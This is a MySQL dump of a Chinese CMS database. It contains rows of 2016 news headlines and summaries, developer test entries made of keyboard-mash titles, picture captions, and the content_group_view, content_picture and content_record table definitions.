INSERT INTO `jc_content_ext` VALUES ('112', '电信诈骗多发产生“蝴蝶效应”虚拟运营商融资受波及', null, null, null, null, '自2013年12月首批企业获牌以来，虚拟运营商发展迅速，目前已有42家企业获得牌照。9月22日，在“ICT中国· 2016高层论坛”移动转售分论坛上，中国通信企业协会披露，目前移动转售业务用户数已超3500万，占全国移动用户人数2.67%。', '2016-10-10 11:48:08', null, 'CK', null, '0', null, null, '/u/cms/www/201610/10114704dsba.jpg', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('113', '李克强联合国承诺援助难民：这是责任和道义的担当', null, null, null, null, '李克强总理首赴联合国，首场活动便是出席由联合国倡议举行的联大解决难移民大规模流动问题高级别会议。', '2016-10-10 11:50:03', null, 'CK', null, '0', null, null, null, null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('114', '科学家研制“隐身潜水服” 跟鲨鱼同游也不怕被发现', null, null, null, null, null, '2016-10-10 13:11:12', null, null, null, '0', null, null, '/u/cms/www/201610/101308178wzr.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('115', '四川石渠发现至少30万公顷珍贵泥炭湿地资源', null, null, null, null, null, '2016-10-10 13:15:37', null, null, null, '0', null, null, '/u/cms/www/201610/101314450fs1.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('116', '全世界最孤独的咖啡馆：海拔4860米 达古冰川之巅', null, null, null, null, null, '2016-10-10 13:19:22', null, null, null, '0', null, null, '/u/cms/www/201610/10131742wzhv.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('117', '中俄“合作－2016”联合反恐训练圆满结束', null, null, null, null, null, '2016-10-10 13:22:07', null, null, null, '0', null, null, '/u/cms/www/201610/101320442qbi.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('118', '探访燕城监狱：蔬菜自己种 午餐两菜一汤', null, null, null, null, null, '2016-10-10 13:23:50', null, null, null, '0', null, null, '/u/cms/www/201610/10132253w0rj.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('119', '摄影师拍摄巨鳄破水而出吞食猎物 上演一箭双雕', null, null, null, null, null, '2016-10-10 13:26:38', null, null, null, '0', null, null, '/u/cms/www/201610/101326014zdc.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('120', '宛如置身黑客帝国 “啤酒丛林”惊艳青岛海滨夜空', null, null, null, null, null, '2016-10-10 13:35:17', null, null, null, '0', null, null, '/u/cms/www/201610/10133449hwwr.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('121', '《半妖倾城》爱与恨，追与逃，人与妖再一次掀起一段的惊人的倾城传奇', null, null, null, null, '清末，八国联军攻入北京，聂如风带着妻子应蝶和二个女儿躲避追杀，应蝶策马将如风和女儿赶走，独自迎敌，应蝶突然长出雪白的翅膀飞了起来——原来她竟然是妖.', '2016-10-10 13:38:11', '/u/cms/www/201610/101338015yhf.mp4', 'CK', null, '0', '/u/cms/www/201610/10133842aiyf.png', null, '/u/cms/www/201610/10133710to3f.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('122', '《那年青春我们正好》刘诗诗、种丹妮演绎闺蜜', null, null, null, null, '《那年青春我们正好》在浙江卫视、东方卫视热播。种丹妮饰演的韩露“花痴”肖小军（郑恺），与闺蜜刘婷（刘诗诗）同爱一人而“掰面”。', '2016-10-10 13:40:05', '/u/cms/www/201610/101338015yhf.mp4', 'CK', null, '0', '/u/cms/www/201610/101340004te2.png', null, '/u/cms/www/201610/10133954jfoc.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('123', '《奔跑吧兄弟》收官对决一触即发 邓超被岳云鹏压垮惨叫', null, null, null, null, '跑男搭档助阵勇士,力争宇宙最强者称号,究竟“跑男团们都有着怎样神奇的能力？最终谁又将在“助力勇士”的帮助下赢得本季“宇宙最强者”的称号呢？', '2016-10-10 13:41:03', '/u/cms/www/201610/101338015yhf.mp4', 'CK', null, '0', '/u/cms/www/201610/101340393eav.png', null, '/u/cms/www/201610/10134048htcl.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('124', '李克强出席加拿大总理家宴 小小特鲁多表演后空翻', null, null, null, null, null, '2016-10-10 13:42:48', '/u/cms/www/201610/101338015yhf.mp4', 'CK', null, '0', null, null, '/u/cms/www/201610/10134238qppo.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('125', '习主席和中央军委领导推进军队战斗力建设纪实', null, null, null, null, null, '2016-10-10 13:44:47', '/u/cms/www/201610/101338015yhf.mp4', 'CK', null, '0', null, null, '/u/cms/www/201610/10134440wmng.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('126', '西北第一村白哈巴的早秋', null, null, null, null, null, '2016-10-10 13:46:01', '/u/cms/www/201610/101338015yhf.mp4', 'CK', null, '0', null, null, '/u/cms/www/201610/101345564pok.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('127', '美国金秋不止红叶', null, null, null, null, null, '2016-10-10 13:46:26', '/u/cms/www/201610/101338015yhf.mp4', 'CK', null, '0', null, null, '/u/cms/www/201610/101346227ayf.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('128', '德国举行南瓜称重比赛 763公斤南瓜获得加冕', null, null, null, null, null, '2016-10-10 13:46:52', '/u/cms/www/201610/101338015yhf.mp4', 'CK', null, '0', null, null, '/u/cms/www/201610/101346473kic.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('129', '北京特战队员魔鬼周训练 挑战50项最严苛极限项目', null, null, null, null, null, '2016-10-10 13:47:24', '/u/cms/www/201610/101338015yhf.mp4', 'CK', null, '0', null, null, '/u/cms/www/201610/10134720z8a5.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('130', '党中央推进民族工作创新发展纪实', null, null, null, null, '奏响新形势下民族工作新乐章（治国理政新思想新实践）党的十八大以来以习近平同志为总书记的党中央推进民族工作创新发展纪实。', '2016-10-10 13:51:07', null, 'CK', null, '0', null, null, '/u/cms/www/201702/012124176acx.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('131', '楼市调控应跳出周期性怪圈', null, null, null, null, '每一轮调控政策都是为稳定住房价格，但调控过后，总有一轮快速上涨行情，越让普通百姓感叹房子越来越买不起了。显然，目前楼市调控实质已陷入越调越高和政府“助涨”的尴尬局面。', '2016-10-10 13:54:05', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('132', '黄金接连下跌难道又等大妈来托盘', null, null, null, null, '三年前，中国大妈们抢购黄金的记忆还历历在目，没想到如今的黄金又开始了一轮又一轮的下跌。', '2016-10-10 13:55:46', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('133', '2016高考状元笔记', null, null, null, null, '分科分章巧复习，内含状元做题方法总结', '2016-10-10 14:08:28', null, null, null, '0', null, null, '/u/cms/www/201610/1014082583ov.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('134', '2015年1季度国民经济开局平稳', null, null, null, null, '初步核算，一季度国内生产总值140667亿元，按可比价格计算，同比增长7.0%。分产业看，第一产业增加值7770亿元，同比增长3.2%；第二产业增加值60292亿元，增长6.4%；第三产业增加值72605亿元，增长7.9%。从环比看，一季度国内生产总值增长1.3%。', '2016-10-10 14:11:44', null, null, null, '0', null, null, '/u/cms/www/201610/10141115d2dm.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('135', '中国法院信息化第三方评估报告', null, null, null, null, '首部法院信息化第三方评估报告发布  全国法院向“智慧法院”升级', '2016-10-10 14:13:55', null, null, null, '0', null, null, '/u/cms/www/201610/10141350dw2t.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('136', '《习近平的国家治理现代化思想》出版', null, null, null, null, '“过去100年世界范围内，放任自由主义、激进社会主义、极端保守主义三大意识形态的经验教训显示，中国的国家治理必须秉承“混合至上”原则，走中国特色的国家治理道路”，中国人民大学政治学教授、比较政治研究所所长，《比较政治评论》主编，《习近平的国家治理现代化思想》一书作者杨光斌在座谈会上表示。', '2016-10-10 14:14:59', null, null, null, '0', null, null, '/u/cms/www/201610/10141429q19h.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('137', '宇宙系统的神秘设计', null, null, null, null, '电影《火星救援》的上映，《科学》杂志匪夷所思的新发现“黑洞吃太阳”，大大掀起一股宇宙热潮。如果再不补充知识，以后恐怕连科幻片都看不懂了。', '2016-10-10 14:17:16', null, null, null, '0', null, null, '/u/cms/www/201610/101415435gn1.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('138', '2015各地区毕业生薪酬报告', null, null, null, null, '各地区、学历毕业生薪酬独家曝光！', '2016-10-10 14:19:56', null, null, null, '0', null, null, '/u/cms/www/201610/10141936fd0q.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('139', 'QRcode国际标准', null, null, null, null, 'QRcode国际标准', '2016-10-10 14:24:49', null, null, null, '0', null, null, '/u/cms/www/201610/10142436t9pe.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('141', '乌兰布统牧歌秋韵', null, null, null, null, null, '2016-10-11 09:44:23', null, null, null, '0', null, null, '/u/cms/www/201610/11093237z5e8.jpg', null, null, '1', null, null, null);
INSERT INTO `jc_content_ext` VALUES ('142', '四川政府采购近三年改革成效明显 政府采购透明度四川最优', '政府采购改革成效明显 透明度四川最优', null, null, null, null, '2017-01-15 23:13:58', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('143', '入常8个月又退常 南昌“总经理”有了新消息', '入常8个月又退常，“微信书记”有了新消息', null, null, null, null, '2017-01-15 23:38:31', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('144', '一声一声案说法的盛大的发售', null, null, null, null, null, '2017-01-15 23:41:09', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('145', '按时发达身份证照V型在v', null, null, null, null, null, '2017-01-15 23:41:39', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('146', '撒娇发阿萨德飞洒发武器二千万人气', null, null, null, null, null, '2017-01-15 23:42:15', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('147', 'qwerqwrasfdasfasfa', null, null, null, null, null, '2017-01-15 23:42:42', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('148', '玩玩儿去玩儿去文如其人', null, null, null, null, null, '2017-01-15 23:43:10', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('149', '姐姐姐姐姐姐了', null, null, null, null, null, '2017-01-15 23:43:51', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('150', 'ggggggggggggggg', null, null, null, null, null, '2017-01-16 00:23:57', null, 'CK', null, '0', null, null, '/u/cms/www/201610/10114452yjhh.jpg', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('151', '的发生大发啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊', null, null, null, null, null, '2017-01-16 00:24:48', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_411.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('152', 'up噢速度发普爱刷屏的发顺丰', null, null, null, null, null, '2017-01-16 00:25:17', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('153', '阿斯顿发沙发舒服撒发生', null, null, null, null, '咋速度发沙发沙发', '2017-01-16 00:25:38', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('154', '啊是的顶顶顶顶顶顶顶顶顶顶的顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶', null, null, null, null, null, '2017-01-16 00:26:09', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_411.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('155', '大事发生的发生发生', null, null, null, null, null, '2017-01-16 00:26:45', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('156', '呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵呵', null, null, null, null, null, '2017-01-16 00:27:10', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_411.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('157', '快快快快快快快快快快快快快快快快快快快快快', null, null, null, null, '速度发沙发沙发', '2017-01-16 00:27:48', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('158', '就发顺丰卡死了发送', null, null, null, null, null, '2017-01-16 00:28:46', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_411.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('159', '快快快快快快快快快快快快快快快快快快快快快', null, null, null, null, null, '2017-01-16 00:29:10', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_411.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('160', '大法师打发阿萨德法师法师的法师法', null, null, null, null, null, '2017-01-16 00:29:38', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('161', '啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦', null, null, null, null, null, '2017-01-16 00:30:14', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('162', '啊啊啊啊啊啊啊啊啊啊啊是的发生', null, null, null, null, null, '2017-01-16 00:30:39', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('163', '啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊阿斯蒂芬', null, null, null, null, null, '2017-01-16 00:31:10', null, 'CK', null, '0', null, null, '/u/cms/www/201610/10114452yjhh.jpg', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('164', '在嘻嘻嘻嘻嘻嘻嘻嘻嘻嘻嘻嘻嘻嘻嘻谢谢', null, null, null, null, null, '2017-01-16 00:31:44', null, 'CK', null, '0', null, null, '/u/cms/www/201610/10114452yjhh.jpg', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('165', '啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦啦是放大师傅', null, null, null, null, null, '2017-01-16 00:32:09', null, 'CK', null, '0', null, null, '/u/cms/www/201610/10114452yjhh.jpg', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('166', 'vczxcvzxv啊啊阿斯顿发生', null, null, null, null, null, '2017-01-16 00:32:37', null, 'CK', null, '0', null, null, '/u/cms/www/201610/10114452yjhh.jpg', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('167', '阿事实上事实上事实上是是是试试沙发舒服撒', null, null, null, null, null, '2017-01-16 00:33:11', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('168', '啊啊啊啊啊啊啊啊啊啊啊啊啊阿斯顿发顺丰撒发顺丰暗示法萨芬', null, null, null, null, null, '2017-01-16 00:33:38', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);
INSERT INTO `jc_content_ext` VALUES ('169', '安抚阿斯顿发顺丰1而沙发沙发舒服撒发生法萨芬', null, null, null, null, null, '2017-01-16 00:34:14', null, 'CK', null, '0', null, null, '/r/cms/www/default/img/index_381.png', null, null, '1', '', null, null);

-- ----------------------------
-- Table structure for jc_content_group_view
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_group_view`;
CREATE TABLE `jc_content_group_view` (
  `content_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  PRIMARY KEY (`content_id`,`group_id`),
  KEY `fk_jc_content_group_v` (`group_id`),
  CONSTRAINT `fk_jc_content_group_v` FOREIGN KEY (`group_id`) REFERENCES `jc_group` (`group_id`),
  CONSTRAINT `fk_jc_group_content_v` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容浏览会员组关联表';

-- ----------------------------
-- Records of jc_content_group_view
-- ----------------------------

-- ----------------------------
-- Table structure for jc_content_picture
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_picture`;
CREATE TABLE `jc_content_picture` (
  `content_id` int(11) NOT NULL,
  `priority` int(11) NOT NULL COMMENT '排列顺序',
  `img_path` varchar(100) NOT NULL COMMENT '图片地址',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  PRIMARY KEY (`content_id`,`priority`),
  CONSTRAINT `fk_jc_picture_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容图片表';

-- ----------------------------
-- Records of jc_content_picture
-- ----------------------------
INSERT INTO `jc_content_picture` VALUES ('2', '0', '/u/cms/www/201607/15154302mvu4.jpg', '当地时间2016年7月5日报道，美国宇航局“朱诺”号探测器成功进入环绕木星轨道，将展开探寻木星起源的任务。');
INSERT INTO `jc_content_picture` VALUES ('2', '1', '/u/cms/www/201607/15154338b6h9.jpg', '据悉，“朱诺”号将环绕木星运行20个月，收集有关该行星核心的数据，描绘其磁场，并测量大气中水和氨的含量。');
INSERT INTO `jc_content_picture` VALUES ('2', '2', '/u/cms/www/201607/15154354xp50.jpg', '另外，“朱诺”号还会观察木星表面著名的大红斑，一个持续了数百年的风暴，从而揭示其深层的秘密。');
INSERT INTO `jc_content_picture` VALUES ('2', '3', '/u/cms/www/201607/15154421y33m.jpg', '美国“朱诺”号探测器成功进入环绕木星轨道');
INSERT INTO `jc_content_picture` VALUES ('7', '0', '/u/cms/www/201607/15153012bpfd.jpg', '旅行类冠军：浓雾中的意大利阿西西圣弗兰西斯大教堂。摄影：Francesco Cattuto');
INSERT INTO `jc_content_picture` VALUES ('7', '1', '/u/cms/www/201607/15153034m1rr.jpg', '旅行类亚军：澳大利亚凯布尔海滩上的一队骆驼。摄影：Todd Kennedy');
INSERT INTO `jc_content_picture` VALUES ('7', '2', '/u/cms/www/201607/15153052j190.jpg', '旅行类季军：大加纳利岛上色彩斑斓的Playa de Amadores海滩。 摄影：Karolis Janulis');
INSERT INTO `jc_content_picture` VALUES ('7', '3', '/u/cms/www/201607/15153110yn2c.jpg', '自然与野生动物类冠军：丹麦Kalbyris森林。摄影：Michael Bernholdt');
INSERT INTO `jc_content_picture` VALUES ('7', '4', '/u/cms/www/201607/15153127qs41.jpg', '自然与野生动物类亚军：罗马尼亚Marpod公路旁的一大群羊。摄影：Szabolcs Ignacz');
INSERT INTO `jc_content_picture` VALUES ('7', '5', '/u/cms/www/201607/15153212rjvo.jpg', '自然与野生动物类季军：留尼旺岛富尔奈斯活火山喷发的壮观景象。摄影：Jonathan Payet');
INSERT INTO `jc_content_picture` VALUES ('7', '6', '/u/cms/www/201607/1515325323eh.jpg', '体育冒险类冠军：攀登者在美国犹他州莫泊峡谷120米处攀爬。摄影：Max Seigal');
INSERT INTO `jc_content_picture` VALUES ('7', '7', '/u/cms/www/201607/15153307441e.jpg', '体育冒险类亚军：在哥伦比亚库库塔举行的游泳比赛。摄影：Juan Pablo Bayona');
INSERT INTO `jc_content_picture` VALUES ('7', '8', '/u/cms/www/201607/15153321t1g3.jpg', '体育冒险类季军：在美国阿拉斯加州科尔多瓦沙滩上玩滑板。摄影：Tj Balon');
INSERT INTO `jc_content_picture` VALUES ('13', '0', '/u/cms/www/201607/19141216070j.jpg', '7月18日，中国空军新闻发言人申进科大校在北京宣布：中国空军近日组织了航空兵赴南海战斗巡航。这次南海战巡，空军出动轰-6K飞机赴黄岩岛等岛礁附近空域进行了巡航。');
INSERT INTO `jc_content_picture` VALUES ('13', '1', '/u/cms/www/201607/19141242pppk.jpg', '申进科介绍，中国空军航空兵此次赴南海例行性战斗巡航，紧贴使命任务和实战准备，轰-6K和歼击机、侦察机、空中加油机等遂行战巡任务，以空中侦察、对抗空战和岛礁巡航为主要样式组织行动，达成了战斗巡航目的。\r\n申进科表示：“根据有效履行空军使命任务的需要，空军航空兵赴南海战斗巡航，将继续常态化进行。”');
INSERT INTO `jc_content_picture` VALUES ('114', '0', '/u/cms/www/201610/101310383u27.jpg', '科学家研制“隐身潜水服” 跟鲨鱼同游也不怕被发现');
INSERT INTO `jc_content_picture` VALUES ('114', '1', '/u/cms/www/201610/101311003aey.jpg', '科学家研制“隐身潜水服” 跟鲨鱼同游也不怕被发现');
INSERT INTO `jc_content_picture` VALUES ('114', '2', '/u/cms/www/201610/101311098e8w.jpg', '科学家研制“隐身潜水服” 跟鲨鱼同游也不怕被发现');
INSERT INTO `jc_content_picture` VALUES ('115', '0', '/u/cms/www/201610/10131516fhw7.jpg', '四川石渠发现至少30万公顷珍贵泥炭湿地资源');
INSERT INTO `jc_content_picture` VALUES ('115', '1', '/u/cms/www/201610/101315235s7b.jpg', '四川石渠发现至少30万公顷珍贵泥炭湿地资源');
INSERT INTO `jc_content_picture` VALUES ('115', '2', '/u/cms/www/201610/101315314qdt.jpg', '四川石渠发现至少30万公顷珍贵泥炭湿地资源');
INSERT INTO `jc_content_picture` VALUES ('116', '0', '/u/cms/www/201610/10131759kpti.jpg', '/u/cms/www/201610/10131742wzhv.jpg');
INSERT INTO `jc_content_picture` VALUES ('116', '1', '/u/cms/www/201610/10131811udfh.jpg', '/u/cms/www/201610/10131742wzhv.jpg');
INSERT INTO `jc_content_picture` VALUES ('117', '0', '/u/cms/www/201610/1013205987uh.jpg', '中俄“合作－2016”联合反恐训练圆满结束');
INSERT INTO `jc_content_picture` VALUES ('117', '1', '/u/cms/www/201610/10132108kvcd.jpg', '中俄“合作－2016”联合反恐训练圆满结束');
INSERT INTO `jc_content_picture` VALUES ('117', '2', '/u/cms/www/201610/10132117q0se.jpg', '中俄“合作－2016”联合反恐训练圆满结束');
INSERT INTO `jc_content_picture` VALUES ('117', '3', '/u/cms/www/201610/10132128e9mz.jpg', '中俄“合作－2016”联合反恐训练圆满结束');
INSERT INTO `jc_content_picture` VALUES ('117', '4', '/u/cms/www/201610/101321427ybi.jpg', '中俄“合作－2016”联合反恐训练圆满结束');
INSERT INTO `jc_content_picture` VALUES ('118', '0', '/u/cms/www/201610/10132256evzu.jpg', '探访燕城监狱：蔬菜自己种 午餐两菜一汤');
INSERT INTO `jc_content_picture` VALUES ('118', '1', '/u/cms/www/201610/10132301wue2.jpg', '探访燕城监狱：蔬菜自己种 午餐两菜一汤');
INSERT INTO `jc_content_picture` VALUES ('118', '2', '/u/cms/www/201610/101323052xt2.jpg', '探访燕城监狱：蔬菜自己种 午餐两菜一汤');
INSERT INTO `jc_content_picture` VALUES ('118', '3', '/u/cms/www/201610/10132310d08y.jpg', '探访燕城监狱：蔬菜自己种 午餐两菜一汤');
INSERT INTO `jc_content_picture` VALUES ('118', '4', '/u/cms/www/201610/10132315avlw.jpg', '探访燕城监狱：蔬菜自己种 午餐两菜一汤');
INSERT INTO `jc_content_picture` VALUES ('118', '5', '/u/cms/www/201610/10132322exj1.jpg', '探访燕城监狱：蔬菜自己种 午餐两菜一汤');
INSERT INTO `jc_content_picture` VALUES ('118', '6', '/u/cms/www/201610/10132327lk40.jpg', '探访燕城监狱：蔬菜自己种 午餐两菜一汤');
INSERT INTO `jc_content_picture` VALUES ('118', '7', '/u/cms/www/201610/10132336658k.jpg', '探访燕城监狱：蔬菜自己种 午餐两菜一汤');
INSERT INTO `jc_content_picture` VALUES ('118', '8', '/u/cms/www/201610/10132342mxeq.jpg', '探访燕城监狱：蔬菜自己种 午餐两菜一汤');
INSERT INTO `jc_content_picture` VALUES ('118', '9', '/u/cms/www/201610/10132347qr6a.jpg', '探访燕城监狱：蔬菜自己种 午餐两菜一汤');
INSERT INTO `jc_content_picture` VALUES ('119', '0', '/u/cms/www/201610/101326217xkx.jpg', '摄影师拍摄巨鳄破水而出吞食猎物 上演一箭双雕');
INSERT INTO `jc_content_picture` VALUES ('119', '1', '/u/cms/www/201610/10132629r00n.jpg', '摄影师拍摄巨鳄破水而出吞食猎物 上演一箭双雕');
INSERT INTO `jc_content_picture` VALUES ('119', '2', '/u/cms/www/201610/10132635f63e.jpg', '摄影师拍摄巨鳄破水而出吞食猎物 上演一箭双雕');
INSERT INTO `jc_content_picture` VALUES ('120', '0', '/u/cms/www/201610/10133454sydj.jpg', '宛如置身黑客帝国 “啤酒丛林”惊艳青岛海滨夜空');
INSERT INTO `jc_content_picture` VALUES ('120', '1', '/u/cms/www/201610/10133506taqx.jpg', '宛如置身黑客帝国 “啤酒丛林”惊艳青岛海滨夜空');
INSERT INTO `jc_content_picture` VALUES ('120', '2', '/u/cms/www/201610/10133511s7r1.jpg', '宛如置身黑客帝国 “啤酒丛林”惊艳青岛海滨夜空');
INSERT INTO `jc_content_picture` VALUES ('120', '3', '/u/cms/www/201610/101335147ye6.jpg', '宛如置身黑客帝国 “啤酒丛林”惊艳青岛海滨夜空');
INSERT INTO `jc_content_picture` VALUES ('141', '0', '/u/cms/www/201610/11094215kqsv.jpg', '乌兰布统牧歌秋韵');
INSERT INTO `jc_content_picture` VALUES ('141', '1', '/u/cms/www/201610/11094229szn0.jpg', '乌兰布统牧歌秋韵');
INSERT INTO `jc_content_picture` VALUES ('141', '2', '/u/cms/www/201610/11094234lj78.jpg', '乌兰布统牧歌秋韵');
INSERT INTO `jc_content_picture` VALUES ('141', '3', '/u/cms/www/201610/11094239ard1.jpg', '乌兰布统牧歌秋韵');
INSERT INTO `jc_content_picture` VALUES ('141', '4', '/u/cms/www/201610/11094243v534.jpg', '乌兰布统牧歌秋韵');
INSERT INTO `jc_content_picture` VALUES ('141', '5', '/u/cms/www/201610/11094246016h.jpg', '乌兰布统牧歌秋韵');
INSERT INTO `jc_content_picture` VALUES ('141', '6', '/u/cms/www/201610/11094250fq4t.jpg', '乌兰布统牧歌秋韵');
INSERT INTO `jc_content_picture` VALUES ('141', '7', '/u/cms/www/201610/11094254usxs.jpg', '乌兰布统牧歌秋韵');
INSERT INTO `jc_content_picture` VALUES ('141', '8', '/u/cms/www/201610/11094257nm5d.jpg', '乌兰布统牧歌秋韵');
INSERT INTO `jc_content_picture` VALUES ('141', '9', '/u/cms/www/201610/11094309iwnb.jpg', '乌兰布统牧歌秋韵');
INSERT INTO `jc_content_picture` VALUES ('141', '10', '/u/cms/www/201610/11094419duy6.jpg', '乌兰布统牧歌秋韵');

-- ----------------------------
-- Table structure for jc_content_record
-- ----------------------------
DROP TABLE IF EXISTS `jc_content_record`;
CREATE TABLE `jc_content_record` (
  `content_record_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `content_id` int(11) NOT NULL DEFAULT '0' COMMENT '文章ID',
  `user_id` int(11) NOT NULL DEFAULT '0' COMMENT '操作人',
  `operate_time` datetime NOT NULL COMMENT '操作时间',
  `operate_type` tinyint(2) NOT NULL DEFAULT '0' COMMENT '0 新增 1修改 2审核 3退回 4移动 5生成静态页 6删除到回收站 7归档 8出档 9推送共享',
  PRIMARY KEY (`content_record_id`),
  KEY `fk_index_jc_content_record_content` (`content_id`),
  KEY `fk_index_jc_content_record_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=88 DEFAULT CHARSET=utf8 COMMENT='文章操作记录';

-- ----------------------------
-- Records of jc_content_record
-- ----------------------------
INSERT INTO `jc_content_record` VALUES ('25', '111', '1', '2017-01-15 00:01:53', '1');
INSERT INTO `jc_content_record` VALUES ('26', '37', '1', '2017-01-15 00:02:17', '1');
INSERT INTO `jc_content_record` VALUES ('27', '130', '1', '2017-01-15 00:09:25', '4');
INSERT INTO `jc_content_record` VALUES ('28', '132', '1', '2017-01-15 00:09:26', '4');
INSERT INTO `jc_content_record` VALUES ('29', '131', '1', '2017-01-15 00:09:26', '4');
INSERT INTO `jc_content_record` VALUES ('30', '113', '1', '2017-01-15 00:09:26', '4');
INSERT INTO `jc_content_record` VALUES ('31', '112', '1', '2017-01-15 00:09:26', '4');
INSERT INTO `jc_content_record` VALUES ('32', '111', '1', '2017-01-15 00:09:26', '4');
INSERT INTO `jc_content_record` VALUES ('33', '39', '1', '2017-01-15 00:09:26', '4');
INSERT INTO `jc_content_record` VALUES ('34', '37', '1', '2017-01-15 00:09:27', '4');
